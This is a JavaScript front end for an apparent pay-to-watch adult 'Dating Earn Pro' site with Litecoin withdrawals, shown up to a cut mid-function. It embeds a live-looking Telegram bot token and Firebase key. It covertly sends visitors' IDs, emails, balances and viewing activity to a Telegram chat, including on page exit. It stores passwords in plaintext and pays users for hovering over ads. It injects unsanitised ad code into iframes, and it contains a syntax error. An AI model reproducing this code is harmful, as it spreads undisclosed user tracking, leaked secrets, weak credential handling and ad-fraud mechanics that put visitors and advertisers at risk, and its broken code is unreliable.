const TELEGRAM_BOT_TOKEN = "8007497540:AAE-uhZOaclMNGLo4w4hNdC_aUh0XHagfjA"; 
const TELEGRAM_CHAT_ID = "-1003825211371";    

const firebaseConfig = { 
    apiKey: "AIzaSyDImi_2Bv4zHce7uDtlRARHOli_N7_nihQ", 
    projectId: "dating-app-ae0ea",
    authDomain: "dating-app-ae0ea.firebaseapp.com"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();
const auth = firebase.auth();

let globalAdCode = ""; 
let allVideos = [];
let filteredVideos = [];

let currentPage = 1;
const itemsPerPage = 30;

let userId = "";
let userEmail = "";
let userPass = "";
let firstLoginTime = "";
let totalVideosWatched = 0;
let totalWatchDurationSeconds = 0;
let totalAdClicks = 0;
let totalGlobalUsers = 0; 
let currentVisitOrder = 1;
let userBalance = 0.00;
let isGoogleUser = false;

let videoStartTime = null;
let currentWatchingVideoTitle = "";
let isOverAd = false;
let currentAdTimer = null; 
let isBrowserExiting = false; 
let isInternalRedirect = false; 

let activeReplyToCommentId = null; 
let totalLoadedCommentsCount = 0;
let lastSeenCommentsCount = parseInt(localStorage.getItem("last_seen_comments_count") || "0");
let isCommentPopupOpen = false;

let myFluidPlayer = null;

const languages = {
    bn: {
        appName: "Dating Earn Pro", premiumTag: "<i class='fa fa-circle' style='color: var(--success);'></i> প্রিমিয়াম লাইভ",
        noticeBadge: "<i class='fa fa-bullhorn'></i> নোটিশ", statUid: "মাই আইডি / ইমেইল", statWallet: "মাই ওয়ালেট",
        statWatched: "রুম ওয়াচ", statClicks: "অ্যাড ক্লিক", cardReview: "<i class='fa fa-star'></i> লাইভ রিভিউ",
        cardComment: "লাইভ কমেন্ট", cardTelegram: "টেলিগ্রাম", cardTelegramSub: "গ্রুপে জয়েন",
        sectionTitle: "<i class='fa fa-video'></i> প্রিমিয়াম লাইভ ভিডিও রুম", btnPrev: "পূর্ববর্তী", btnNext: "পরবর্তী",
        navHome: "<i class='fa fa-home'></i>হোমপেজ", navRefresh: "<i class='fa fa-refresh'></i>রিফ্রেশ অ্যাপ",
        walletHeader: "মাই আর্নিং ও উইথড্রাল হিস্টোরি", walletBalTitle: "মোট ব্যালেন্স", walletMethod: "LTC Litecoin (উইথড্র মেথড)",
        walletAddrLabel: "আপনার Litecoin (LTC) অ্যাড্রেস দিন:", walletAddrPlh: "LTC Address লিখুন...",
        walletAmtLabel: "উইথড্র পরিমাণ (USD):", walletAmtPlh: "Amount দিন...", walletSubmitBtn: "উইথড্র রিকোয়েস্ট পাঠান",
        walletHistoryTitle: "উইথড্রাল হিস্টোরি", commentHeader: "পাবলিক লাইভ কমেন্ট জোন", commentPlh: "আপনার কমেন্ট লিখুন...",
        alertTitle: "অ্যাকাউন্ট நோটিশ!", alertBtn: "ঠিক আছে", allRooms: "সব রুম", freeRoom: "Free Room", justUploaded: "সদ্য আপলোড",
        noHistory: "কোনো হিস্টোরি পাওয়া যায়নি।", noComments: "কোনো পাবলিক কমেন্ট নেই! প্রথম কমেন্টটি আপনি করুন।",
        noVideos: "কোনো ভিডিও রুম পাওয়া যায়নি।", pageLabel: "পেজ: ", replyText: "উত্তর দিন", loading: "লোড হচ্ছে...",
        alertGoogleSignup: "গুগল সাইন আপ ছাড়া ডলার আর্ন করতে পারবেন না, বিজ্ঞাপন ক্লিক গ্রহণযোগ্য হবে না। আর্ন করার জন্য গুগল সাইন আপ করুন!",
        legalFooter: `<h4>⚖️ TERMS OF SERVICE & DISCLAIMER</h4>
        <p>
            ১. এই সাইটে প্রদর্শিত সমস্ত ভিডিও ও তথ্য ইন্টারনেট ও থার্ড-পার্টি সোর্স থেকে সংগৃহীত। কোনো কন্টেন্ট সরাসরি আমাদের নিজস্ব সার্ভারে হোস্ট বা আপলোড করা হয় না।<br>
            ২. এটি একটি ১৮+ বিনোদনমূলক প্ল্যাটফর্ম। সাইটে প্রবেশ করার মাধ্যমে আপনি নিশ্চিত করেছেন যে আপনার বয়স ১৮ বছরের উর্ধ্বে এবং আপনি আপনি আপনার নিজস্ব দায়িত্ব এখানে ভিজিট করছেন।<br>
            ৩. এখানে প্রদর্শিত বিজ্ঞাপনী কন্টেন্ট সম্পূর্ণ স্বয়ংক্রিয় এবং বিজ্ঞাপনদাতাদের দ্বারা নিয়ন্ত্রিত। বিজ্ঞাপনে প্রদর্শিত কোনো প্রলোভন, অফার বা ট্রানজেকশনের দায় এই সাইট কর্তৃপক্ষের নয়।<br>
            ৪. কোনো প্রকার ডিজিটাল অসদুপায়, আইনি ক্ষতি অথবা সমাজ-বিরোধী আচরণের জন্য এই সাইট বা এর নির্মাতা কোনো অবস্থাতেই দায়ী থাকবেন না।
        </p>
        <div style="margin-top: 10px; font-size: 10px; color: #444;">&copy; Dating Earn Pro | All Rights Reserved.</div>`
    },
    en: {
        appName: "Dating Earn Pro", premiumTag: "<i class='fa fa-circle' style='color: var(--success);'></i> Premium Live",
        noticeBadge: "<i class='fa fa-bullhorn'></i> Notice", statUid: "My ID / Email", statWallet: "My Wallet",
        statWatched: "Room Watched", statClicks: "Ad Clicks", cardReview: "<i class='fa fa-star'></i> Live Review",
        cardComment: "Live Comment", cardTelegram: "Telegram", cardTelegramSub: "Join Group",
        sectionTitle: "<i class='fa fa-video'></i> Premium Live Video Rooms", btnPrev: "Previous", btnNext: "Next",
        navHome: "<i class='fa fa-home'></i>Homepage", navRefresh: "<i class='fa fa-refresh'></i>Refresh App",
        walletHeader: "My Earnings & Withdrawal History", walletBalTitle: "Total Balance", walletMethod: "LTC Litecoin (Withdraw Method)",
        walletAddrLabel: "Enter your Litecoin (LTC) Address:", walletAddrPlh: "Enter LTC Address...",
        walletAmtLabel: "Withdraw Amount (USD):", walletAmtPlh: "Enter Amount...", walletSubmitBtn: "Send Withdraw Request",
        walletHistoryTitle: "Withdrawal History", commentHeader: "Public Live Comment Zone", commentPlh: "Write your comment...",
        alertTitle: "Account Notice!", alertBtn: "OK", allRooms: "All Rooms", freeRoom: "Free Room", justUploaded: "Just Uploaded",
        noHistory: "No history found.", noComments: "No public comments yet! Be the first to comment.",
        noVideos: "No video rooms found.", pageLabel: "Page: ", replyText: "Reply", loading: "Loading...",
        alertGoogleSignup: "You cannot earn dollars without Google Sign-up, ad clicks will not be valid. Please Sign-up with Google to earn!",
        legalFooter: `<h4>⚖️ TERMS OF SERVICE & DISCLAIMER</h4>
        <p>
            1. All videos and information displayed on this site are collected from internet and third-party sources. No content is directly hosted or uploaded on our own servers.<br>
            2. This is an 18+ entertainment platform. By entering the site, you confirm that you are over 18 years old and visiting at your own responsibility.<br>
            3. The advertisement content displayed here is fully automated and controlled by the advertisers. The site authority is not responsible for any offers, claims, or transactions shown in ads.<br>
            4. Under no circumstances shall this site or its creator be held liable for any digital malpractice, legal damages, or anti-social activities.
        </p>
        <div style="margin-top: 10px; font-size: 10px; color: #444;">&copy; Dating Earn Pro | All Rights Reserved.</div>`
    }
};

function changeLanguage(lang) {
    localStorage.setItem("app_lang", lang);
    const switcher = document.getElementById("lang-switcher");
    if(switcher) switcher.value = lang;
    
    const l = languages[lang];
    if(!l) return;
    
    if(document.getElementById("lbl-app-name")) document.getElementById("lbl-app-name").innerHTML = l.appName;
    if(document.getElementById("lbl-premium-tag")) document.getElementById("lbl-premium-tag").innerHTML = l.premiumTag;
    if(document.getElementById("lbl-notice-badge")) document.getElementById("lbl-notice-badge").innerHTML = l.noticeBadge;
    if(document.getElementById("lbl-stat-uid")) document.getElementById("lbl-stat-uid").innerText = l.statUid;
    if(document.getElementById("lbl-stat-wallet")) document.getElementById("lbl-stat-wallet").innerText = l.statWallet;
    if(document.getElementById("lbl-stat-watched")) document.getElementById("lbl-stat-watched").innerText = l.statWatched;
    if(document.getElementById("lbl-stat-clicks")) document.getElementById("lbl-stat-clicks").innerText = l.statClicks;
    if(document.getElementById("lbl-card-review")) document.getElementById("lbl-card-review").innerHTML = l.cardReview;
    if(document.getElementById("lbl-card-comment")) document.getElementById("lbl-card-comment").innerText = l.cardComment;
    if(document.getElementById("lbl-card-telegram")) document.getElementById("lbl-card-telegram").innerText = l.cardTelegram;
    if(document.getElementById("lbl-card-telegram-sub")) document.getElementById("lbl-card-telegram-sub").innerText = l.cardTelegramSub;
    if(document.getElementById("lbl-section-title")) document.getElementById("lbl-section-title").innerHTML = l.sectionTitle;
    if(document.getElementById("lbl-btn-prev")) document.getElementById("lbl-btn-prev").innerText = l.btnPrev;
    if(document.getElementById("lbl-btn-next")) document.getElementById("lbl-btn-next").innerText = l.btnNext;
    if(document.getElementById("lbl-nav-home")) document.getElementById("lbl-nav-home").innerHTML = `<i class='fa fa-home'></i>` + l.navHome;
    if(document.getElementById("lbl-nav-refresh")) document.getElementById("lbl-nav-refresh").innerHTML = `<i class='fa fa-refresh'></i>` + l.navRefresh;
    
    if(document.getElementById("lbl-wallet-header")) document.getElementById("lbl-wallet-header").innerText = l.walletHeader;
    if(document.getElementById("lbl-wallet-bal-title")) document.getElementById("lbl-wallet-bal-title").innerText = l.walletBalTitle;
    if(document.getElementById("lbl-wallet-method")) document.getElementById("lbl-wallet-method").innerText = l.walletMethod;
    if(document.getElementById("lbl-wallet-addr-label")) document.getElementById("lbl-wallet-addr-label").innerText = l.walletAddrLabel;
    if(document.getElementById("wallet-ltc-address")) document.getElementById("wallet-ltc-address").placeholder = l.walletAddrPlh;
    if(document.getElementById("lbl-wallet-amt-label")) document.getElementById("lbl-wallet-amt-label").innerText = l.walletAmtLabel;
    if(document.getElementById("wallet-withdraw-amount")) document.getElementById("wallet-withdraw-amount").placeholder = l.walletAmtPlh;
    if(document.getElementById("lbl-wallet-submit-btn")) document.getElementById("lbl-wallet-submit-btn").innerText = l.walletSubmitBtn;
    if(document.getElementById("lbl-wallet-history-title")) document.getElementById("lbl-wallet-history-title").innerText = l.walletHistoryTitle;
    if(document.getElementById("lbl-comment-header")) document.getElementById("lbl-comment-header").innerText = l.commentHeader;
    if(document.getElementById("txt-user-comment")) document.getElementById("txt-user-comment").placeholder = l.commentPlh;
    if(document.getElementById("lbl-alert-title")) document.getElementById("lbl-alert-title").innerText = l.alertTitle;
    if(document.getElementById("lbl-alert-btn")) document.getElementById("lbl-alert-btn").innerText = l.alertBtn;
    if(document.getElementById("legal-footer-area")) document.getElementById("legal-footer-area").innerHTML = l.legalFooter;
    
    let catAllBtn = document.getElementById("cat-all");
    if(catAllBtn) catAllBtn.innerText = l.allRooms;
    
    updatePaginationControls();
    displayVideosPage();
}

function showCustomAlert(msg) {
    if(document.getElementById('custom-alert-msg')) document.getElementById('custom-alert-msg').innerText = msg;
    if(document.getElementById('custom-alert-zone')) document.getElementById('custom-alert-zone').style.display = 'flex';
}
function closeCustomAlert() {
    if(document.getElementById('custom-alert-zone')) document.getElementById('custom-alert-zone').style.display = 'none';
}

window.onload = function() {
    let savedLang = localStorage.getItem("app_lang") || "bn";
    changeLanguage(savedLang);

    if(!sessionStorage.getItem("tr_login_time")) {
        sessionStorage.setItem("tr_login_time", new Date().toLocaleString('en-US'));
    }
    firstLoginTime = sessionStorage.getItem("tr_login_time");

    auth.getRedirectResult().then((result) => {
        if (result.user) {
            const user = result.user;
            userEmail = user.email || "No Email";
            userId = user.uid; 
            
            localStorage.setItem("tr_user_email", userEmail);
            localStorage.setItem("tr_user_id", userId);
            localStorage.setItem("is_google_user", "true");
            isGoogleUser = true;
            
            if(document.getElementById('verification-overlay')) document.getElementById('verification-overlay').style.display = 'none';
            if(document.getElementById('main-app')) document.getElementById('main-app').style.display = 'block';
            processUserSession(userId, true);
        } else {
            if (localStorage.getItem("tr_user_id")) {
                userId = localStorage.getItem("tr_user_id");
                userEmail = localStorage.getItem("tr_user_email") || "Auto Generated";
                userPass = localStorage.getItem("tr_user_pass") || "Generated";
                isGoogleUser = localStorage.getItem("is_google_user") === "true";
                if(document.getElementById('verification-overlay')) document.getElementById('verification-overlay').style.display = 'none';
                if(document.getElementById('main-app')) document.getElementById('main-app').style.display = 'block';
                processUserSession(userId, false); 
            } else {
                if(document.getElementById('verification-overlay')) document.getElementById('verification-overlay').style.display = 'flex';
            }
        }
    }).catch((error) => {
        console.error("Redirect Error: ", error);
        if (localStorage.getItem("tr_user_id")) {
            userId = localStorage.getItem("tr_user_id");
            if(document.getElementById('verification-overlay')) document.getElementById('verification-overlay').style.display = 'none';
            if(document.getElementById('main-app')) document.getElementById('main-app').style.display = 'block';
            processUserSession(userId, false);
        }
    });
};

window.history.pushState(null, null, window.location.href);
window.onpopstate = function() {
    window.history.pushState(null, null, window.location.href);
    if (sessionStorage.getItem("is_player_open") === "true") {
        if(document.getElementById('main-app')) document.getElementById('main-app').style.display = 'none';
        if(document.getElementById('video-player-container')) document.getElementById('video-player-container').style.display = 'flex';
    }
};

function sendOrUpdateTelegramReport(isOfflineStatus = false) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !userId) return;
    if (isOfflineStatus && !isBrowserExiting) return; 

    let durationText = "";
    if (totalWatchDurationSeconds >= 60) {
        durationText = `${Math.floor(totalWatchDurationSeconds / 60)} Min ${totalWatchDurationSeconds % 60} Sec`;
    } else {
        durationText = `${totalWatchDurationSeconds} SECOND`;
    }

    let statusHeader = isOfflineStatus ? "🔴 *ইউজার অফলাইন রিপোর্ট (ডিভাইস লেфт)*" : "📱 *ইউজার লাইভ ট্র্যাকিং রিপোর্ট*";
    let statusFooter = isOfflineStatus ? "❌ _স্ট্যাটাস: ইউজার সাইট বন্ধ করে চলে গেছে!_" : "🔄 _স্ট্যাটাস: ইউজার সাইটে অ্যাক্টিভ আছে..._";
    let visitText = currentVisitOrder > 1 ? `পুরাতন ইউজার (${currentVisitOrder}তম বার প্রবেশ)` : "নতুন ইউজার (১ম ভিজিট)";

    const messageText = `${statusHeader}\n━━━━━━━━━━━━━━━━━━\n👥 মোট ইউজার: *${totalGlobalUsers} জন*\n👤 আইডি: \`${userId}\`\n📧 ইমেইল: *${userEmail}*\n💰 ব্যালেন্স: *$${userBalance.toFixed(4)} USD*\n📊 ভিজিট: (${visitText})\n⏰ প্রবেশের সময়: ${firstLoginTime}\n\n🎬 *ভিдео দেখার হিসাব:*\n• মোট ভিডিও দেখেছে: *${totalVideosWatched} টি*\n• মোট দেখার সময়: *${durationText}*\n\n⚠️ *বিজ্ঞাপনের হিসাব:*\n• মোট বিজ্ঞাপনে ক্লিক: *${totalAdClicks} বার*\n\n${statusFooter}`;

    const savedMsgId = sessionStorage.getItem("telegram_msg_id");
    const url = isOfflineStatus ? `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage` : (savedMsgId ? `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText` : `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`);
    
    let payload = { chat_id: TELEGRAM_CHAT_ID, text: messageText, parse_mode: "Markdown" };
    if (!isOfflineStatus && savedMsgId) {
        payload.message_id = parseInt(savedMsgId);
    }

    if (isOfflineStatus) {
        fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload), keepalive: true });
        sessionStorage.removeItem("telegram_msg_id");
    } else {
        fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) })
        .then(res => res.json())
        .then(data => {
            if (data.ok && data.result && !savedMsgId) { 
                sessionStorage.setItem("telegram_msg_id", data.result.message_id); 
            }
        }).catch(err => console.error(err));
    }
}

function handleOfflineBehavior() {
    if (videoStartTime) {
        const videoEndTime = new Date();
        const diff = Math.round((videoEndTime - videoStartTime) / 1000);
        totalWatchDurationSeconds += diff;
        db.collection("user_profiles").doc(userId).update({ watch_duration: totalWatchDurationSeconds });
        videoStartTime = new Date();
    }
    sendOrUpdateTelegramReport(true);
}

window.addEventListener('beforeunload', function () {
    if (!isInternalRedirect) {
        isBrowserExiting = true;
        handleOfflineBehavior();
    }
});
window.addEventListener('pagehide', function() {
    if (!isInternalRedirect) {
        isBrowserExiting = true;
        handleOfflineBehavior();
    }
});

function acceptTerms() {
    if(document.getElementById('terms-box')) document.getElementById('terms-box').style.display = 'none';
    if(document.getElementById('age-box')) document.getElementById('age-box').style.display = 'block';
}

function generateAutoAccountAndProceed() {
    if (!localStorage.getItem("tr_user_id")) {
        const randomID = "USER-" + Math.floor(100000 + Math.random() * 900000);
        const randomPass = Math.random().toString(36).slice(-8).toUpperCase();
        
        userId = randomID;
        userPass = randomPass;
        userEmail = "Auto Generated";

        localStorage.setItem("tr_user_id", userId);
        localStorage.setItem("tr_user_pass", userPass);
        localStorage.setItem("tr_user_email", userEmail);
        localStorage.setItem("is_google_user", "false");
    } else {
        userId = localStorage.getItem("tr_user_id");
        userPass = localStorage.getItem("tr_user_pass") || "SECRET";
        userEmail = localStorage.getItem("tr_user_email") || "Auto Generated";
    }

    if(document.getElementById('overlay-auto-uid')) document.getElementById('overlay-auto-uid').innerText = userId;
    if(document.getElementById('overlay-auto-pass')) document.getElementById('overlay-auto-pass').innerText = userPass;

    if(document.getElementById('age-box')) document.getElementById('age-box').style.display = 'none';
    if(document.getElementById('google-box')) document.getElementById('google-box').style.display = 'block';
}

function skipGoogleAndEnter() {
    let currentLang = localStorage.getItem("app_lang") || "bn";
    showCustomAlert(languages[currentLang].alertGoogleSignup);
    
    if(document.getElementById('verification-overlay')) document.getElementById('verification-overlay').style.display = 'none';
    if(document.getElementById('main-app')) document.getElementById('main-app').style.display = 'block';
    isGoogleUser = false;
    localStorage.setItem("is_google_user", "false");
    processUserSession(userId, true);
}

function handleGoogleSignIn() {
    isInternalRedirect = true;
    const provider = new firebase.auth.GoogleAuthProvider();
    auth.signInWithRedirect(provider);
}

// লগআউট ফিক্স: সম্পূর্ণভাবে লোকাল ও সেশন স্টোরেজ ক্লিয়ার করে রিফ্রেশ করবে
function handleLogout() {
    localStorage.clear();
    sessionStorage.clear();
    window.location.reload();
}

function processUserSession(targetUid, isNewUser) {
    isGoogleUser = localStorage.getItem("is_google_user") === "true";
    const currentPass = localStorage.getItem("tr_user_pass") || "Generated";

    const counterRef = db.collection("settings").doc("user_counter");
    const profileRef = db.collection("user_profiles").doc(targetUid);

    db.runTransaction((transaction) => {
        return transaction.get(counterRef).then((sfDoc) => {
            return transaction.get(profileRef).then((pDoc) => {
                let globalCount = sfDoc.exists ? (sfDoc.data().count || 0) : 0;
                let visitOrder = 1;
                let alreadyCounted = sessionStorage.getItem("visit_counted") === "true";

                if (pDoc.exists) {
                    let dData = pDoc.data();
                    visitOrder = dData.visits || 1;
                    userBalance = dData.balance || 0.00;
                    totalVideosWatched = dData.videos_watched || 0;
                    totalAdClicks = dData.ad_clicks || 0;
                    totalWatchDurationSeconds = dData.watch_duration || 0;
                    
                    if(!alreadyCounted) {
                        visitOrder += 1;
                        transaction.update(profileRef, { visits: visitOrder, email: userEmail, pass: currentPass, last_seen: new Date() });
                    }
                } else {
                    if (isNewUser) { globalCount += 1; }
                    transaction.set(counterRef, { count: globalCount });
                    transaction.set(profileRef, { 
                        visits: 1, email: userEmail, pass: currentPass, balance: 0.00, 
                        videos_watched: 0, ad_clicks: 0, watch_duration: 0,
                        created_at: new Date(), last_seen: new Date() 
                    });
                    userBalance = 0.00;
                    totalVideosWatched = 0;
                    totalAdClicks = 0;
                    totalWatchDurationSeconds = 0;
                }
                return { globalCount, visitOrder };
            });
        });
    }).then((res) => {
        totalGlobalUsers = res.globalCount;
        currentVisitOrder = res.visitOrder;
        sessionStorage.setItem("visit_counted", "true");
        
        db.collection("user_profiles").doc(targetUid).onSnapshot(doc => {
            if (doc.exists) {
                let dData = doc.data();
                userBalance = dData.balance || 0.00;
                totalVideosWatched = dData.videos_watched || 0;
                totalAdClicks = dData.ad_clicks || 0;
                totalWatchDurationSeconds = dData.watch_duration || 0;
                let displayEmail = dData.email || userEmail || "Auto Generated";
                
                let langLabelRooms = localStorage.getItem("app_lang") === "en" ? " rooms" : " টি";
                let langLabelTimes = localStorage.getItem("app_lang") === "en" ? " times" : " বার";

                if(document.getElementById('lbl-panel-watched')) document.getElementById('lbl-panel-watched').innerText = totalVideosWatched + langLabelRooms;
                if(document.getElementById('lbl-panel-clicks')) document.getElementById('lbl-panel-clicks').innerText = totalAdClicks + langLabelTimes;
                if(document.getElementById('lbl-panel-uid')) document.getElementById('lbl-panel-uid').innerHTML = `${targetUid}<br><span style='color:#a29bfe; font-size:10px;'>P: ${currentPass}</span><br><span style='color:#00f2fe; font-size:10px;'>${displayEmail}</span>`;
                if(document.getElementById('lbl-panel-earnings')) document.getElementById('lbl-panel-earnings').innerText = `$${userBalance.toFixed(4)} USD`;
                if(document.getElementById('modal-wallet-balance')) document.getElementById('modal-wallet-balance').innerText = `$${userBalance.toFixed(4)} USD`;
            }
        });

        initApp();
        sendOrUpdateTelegramReport(); 
    }).catch((err) => {
        console.error("Transaction failed: ", err);
        initApp();
    });
}

function initApp() {
    loadGlobalSettings();
    loadCategories();
    loadVideosList();
    setupAdClickTracker();
    listenGlobalRatings();
    listenGlobalComments();
    loadWithdrawHistory();
}

function accessDenied() { window.location.href = "https://www.google.com"; }

function setupAdClickTracker() {
    const adSelectors = ['#top-cover-ad-wrapper', '#middle-ad-wrapper', '#home-bottom-ad-wrapper', '#player-top-ad-wrapper', '#player-bottom-ad-wrapper'];
    adSelectors.forEach(selector => {
        const el = document.querySelector(selector);
        if(el) {
            el.addEventListener('mouseover', () => { isOverAd = true; startAdClickTimer(); });
            el.addEventListener('mouseout', () => { isOverAd = false; clearAdClickTimer(); });
            el.addEventListener('touchstart', () => { isOverAd = true; startAdClickTimer(); }, {passive: true});
            el.addEventListener('touchend', () => { setTimeout(() => { isOverAd = false; clearAdClickTimer(); }, 1000); }, {passive: true});
        }
    });
}

// বিজ্ঞাপন ক্লিক ট্র্যাকিং টাইমার ৩ সেকেন্ড (৩০০০ মিলি-সেকেন্ড) এ পরিবর্তন করা হয়েছে
function startAdClickTimer() {
    if (currentAdTimer) return;
    if (!isGoogleUser) return;

    currentAdTimer = setTimeout(() => {
        if (isOverAd) {
            totalAdClicks++;
            let addedEarn = 0.0005;

            db.collection("user_profiles").doc(userId).update({
                ad_clicks: firebase.firestore.FieldValue.increment(1),
                balance: firebase.firestore.FieldValue.increment(addedEarn)
            }).then(() => {
                sendOrUpdateTelegramReport();
                clearAdClickTimer();
            });
        }
    }, 3000); // ৩ সেকেন্ড ফিক্সড টাইমার
}

function clearAdClickTimer() {
    if (currentAdTimer) {
        clearTimeout(currentAdTimer);
        currentAdTimer = null;
    }
}

window.onblur = function() { clearAdClickTimer(); };
window.onfocus = function() { if (isOverAd) startAdClickTimer(); };

function openWalletPopup() {
    if(document.getElementById('global-wallet-modal')) document.getElementById('global-wallet-modal').style.display = 'flex';
}
function closeWalletPopup() {
    if(document.getElementById('global-wallet-modal')) document.getElementById('global-wallet-modal').style.display = 'none';
}
function closeWalletPopupOutside(e) {
    if (e.target.id === "global-wallet-modal") closeWalletPopup();
}

function submitWithdrawRequest() {
    const address = document.getElementById('wallet-ltc-address').value.trim();
    const amount = parseFloat(document.getElementById('wallet-withdraw-amount').value.trim());
    
    if (!address || isNaN(amount) || amount <= 0) {
        alert(localStorage.getItem("app_lang") === "en" ? "Enter correct address and amount!" : "সঠিক অ্যাড্রেস এবং পরিমাণ দিন!");
        return;
    }
    if (amount > userBalance) {
        alert(localStorage.getItem("app_lang") === "en" ? "Insufficient wallet balance!" : "আপনার ওয়ালেটে পর্যাপ্ত ব্যালেন্স নেই!");
        return;
    }

    db.collection("withdraws").add({
        user_id: userId,
        email: userEmail,
        ltc_address: address,
        amount_usd: amount,
        status: "Pending",
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
    }).then(() => {
        return db.collection("user_profiles").doc(userId).update({
            balance: firebase.firestore.FieldValue.increment(-amount)
        });
    }).then(() => {
        alert(localStorage.getItem("app_lang") === "en" ? "Withdraw request submitted successfully!" : "উইথড্র রিকোয়েস্ট সফলভাবে পাঠানো হয়েছে!");
        document.getElementById('wallet-ltc-address').value = "";
        document.getElementById('wallet-withdraw-amount').value = "";
        
        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            const msg = `💰 *নতুন উইথড্রাল রিকোয়েস্ট*\n━━━━━━━━━━━━━━━━━━\n👤 ইউজার আইডি: \`${userId}\`\n📧 ইমেইল: ${userEmail}\n🪙 LTC Address: \`${address}\`\n💵 পরিমাণ: *$${amount.toFixed(4)} USD*\n⏳ স্ট্যাটাস: *Pending*`;
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: "Markdown" })
            });
        }
    }).catch(err => {
        console.error(err);
        alert(localStorage.getItem("app_lang") === "en" ? "Withdrawal submission failed!" : "উইথড্র সাবমিট ব্যর্থ হয়েছে!");
    });
}

function loadWithdrawHistory() {
    db.collection("withdraws").where("user_id", "==", userId).orderBy("timestamp", "desc").onSnapshot(snap => {
        const container = document.getElementById('withdraw-history-container');
        if(!container) return;
        let currentLang = localStorage.getItem("app_lang") || "bn";
        container.innerHTML = "";
        if(snap.empty) {
            container.innerHTML = languages[currentLang].noHistory;
            return;
        }
        snap.forEach(doc => {
            const data = doc.data();
            let dateStr = data.timestamp ? data.timestamp.toDate().toLocaleDateString() : "Just Now";
            container.innerHTML += `<div style="border-bottom:1px solid #333; padding:6px 0;">
                <b>${dateStr}</b> - $${data.amount_usd.toFixed(4)} USD [${data.status}]<br>
                <span style="color:#777; font-size:10px;">LTC: ${data.ltc_address}</span>
            </div>`;
        });
    });
}

function renderAdCode(elementId, codeOrUrl) {
    const container = document.getElementById(elementId);
    if (!container || !codeOrUrl) return;
    container.innerHTML = "";

    if (codeOrUrl.startsWith("http://") || codeOrUrl.startsWith("https://")) {
        if (codeOrUrl.match(/\.(mp4|webm|ogg)$/i)) {
            container.innerHTML = `<video src="${codeOrUrl}" autoplay muted loop playsinline style="width:100% !important; height:100%; object-fit:contain; display:block;"></video>`;
        } else if (codeOrUrl.match(/\.(jpeg|jpg|gif|png|webp)$/i)) {
            container.innerHTML = `<img src="${codeOrUrl}" style="width:100% !important; height:100%; object-fit:contain; display:block;">`;
        } else {
            container.innerHTML = `<iframe src="${codeOrUrl}" autoplay muted loop style="width:100% !important; height:100%; border:none; margin:0; padding:0; display:block;"></iframe>`;
        }
    } else {
        const iframe = document.createElement("iframe");
        iframe.style.width = "100%"; iframe.style.height = "100%"; iframe.style.border = "none"; iframe.style.display = "block";
        container.appendChild(iframe);
        const iframeDoc = iframe.contentWindow.document;
        iframeDoc.open();
        iframeDoc.write(`<!DOCTYPE html><html><body style="margin:0;padding:0;display:flex;justify-content:center;align-items:center;"><div>${codeOrUrl}</div></body></html>`);
        iframeDoc.close();
    }
}

function loadGlobalSettings() {
    db.collection("settings").doc("app_info").onSnapshot(doc => {
        if(doc.exists) {
            const data = doc.data();
            let topAdCode = data.ad_top_code || data.ad_code || data.direct_ad_url || "";
            let middleAdCode = data.ad_middle_code || data.ad_code || data.direct_ad_url || "";
            let bottomAdCode = data.ad_bottom_code || data.ad_code || data.direct_ad_url || "";
            
            globalAdCode = topAdCode; 
            if(document.getElementById('app-notice-text')) {
                document.getElementById('app-notice-text').innerText = data.admin_rule || (localStorage.getItem("app_lang") === "en" ? "Welcome to our live room!" : "আমাদের লাইভ রুমে স্বাগত!");
            }
            
            if(topAdCode !== "") { renderAdCode('top-cover-ad-wrapper', topAdCode); }
            if(middleAdCode !== "") { renderAdCode('middle-ad-wrapper', middleAdCode); }
            if(bottomAdCode !== "") { renderAdCode('home-bottom-ad-wrapper', bottomAdCode); }
        }
    });
}

function loadCategories() {
    db.collection("app_categories").onSnapshot(snap => {
        const container = document.getElementById('category-list-wrapper');
        if(!container) return;
        let currentLang = localStorage.getItem("app_lang") || "bn";
        container.innerHTML = `<button class="cat-btn active" id="cat-all" onclick="filterCategory('all')">${languages[currentLang].allRooms}</button>`;
        snap.forEach(doc => {
            container.innerHTML += `<button class="cat-btn" id="cat-${doc.id}" onclick="filterCategory('${doc.id}')">${doc.data().name}</button>`;
        });
    });
}

function loadVideosList() {
    db.collection("app_videos").orderBy("time", "desc").onSnapshot(snap => {
        allVideos = [];
        snap.forEach(doc => { allVideos.push({ id: doc.id, ...doc.data() }); });
        filterCategory('all');
    });
}

function displayVideosPage() {
    const container = document.getElementById('video-list-container');
    if(!container) return;
    let currentLang = localStorage.getItem("app_lang") || "bn";
    container.innerHTML = "";
    
    if(filteredVideos.length === 0) { 
        container.innerHTML = `<p style='grid-column:1/-1; text-align:center; color:#555; padding:20px;'>${languages[currentLang].noVideos}</p>`; 
        updatePaginationControls();
        return; 
    }
    
    const now = new Date();
    const startIndex = (currentPage - 1) * itemsPerPage;
    const endIndex = startIndex + itemsPerPage;
    const pageItems = filteredVideos.slice(startIndex, endIndex);

    pageItems.forEach(v => {
        let badgeHtml = "";
        let timeString = languages[currentLang].justUploaded;
        
        if (v.time) {
            let uploadDate = v.time.toDate ? v.time.toDate() : new Date(v.time);
            let diffMs = now - uploadDate;
            let diffHours = diffMs / (1000 * 60 * 60);
            
            if (diffHours <= 24 && diffHours >= 0) {
                badgeHtml = `<div class="badge-new">NEW</div>`;
            }
            if(currentLang === 'en') {
                timeString = uploadDate.toLocaleDateString('en-US') + " " + uploadDate.toLocaleTimeString('en-US', {hour: '2-digit', minute:'2-digit'});
            } else {
                timeString = uploadDate.toLocaleDateString('bn-BD'] + " " + uploadDate.toLocaleTimeString('bn-BD', {hour: '2-digit', minute:'2-digit'});
            }
        }

